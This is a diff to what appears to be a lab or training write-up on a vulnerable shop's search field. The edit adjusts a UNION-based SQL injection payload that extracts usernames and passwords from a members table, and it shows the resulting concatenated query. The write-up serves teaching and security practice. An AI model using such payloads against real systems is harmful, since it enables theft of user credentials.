@@ -21,8 +21,8 @@ The search in the top bar can be used for an SQL-injection. When you search for 
 SELECT * FROM products WHERE hidden = 0 AND name LIKE '%car%'
 ```
 
-The search string is not correctly sanitised but inserted using simple string concatenation. Therefore you can use a search term like `' UNION SELECT null, username, password, null FROM members; -- x` to get a query that looks like this: 
+The search string is not correctly sanitised but inserted using simple string concatenation. Therefore you can use a search term like `' UNION SELECT null, username, password, null, null, null FROM members; -- x` to get a query that looks like this: 
 
 ```
-SELECT * FROM products WHERE hidden = 0 AND name LIKE '%' UNION SELECT null, username, password, null FROM members; -- x%'
+SELECT * FROM products WHERE hidden = 0 AND name LIKE '%' UNION SELECT null, username, password, null, null, null FROM members; -- x%'
 ```
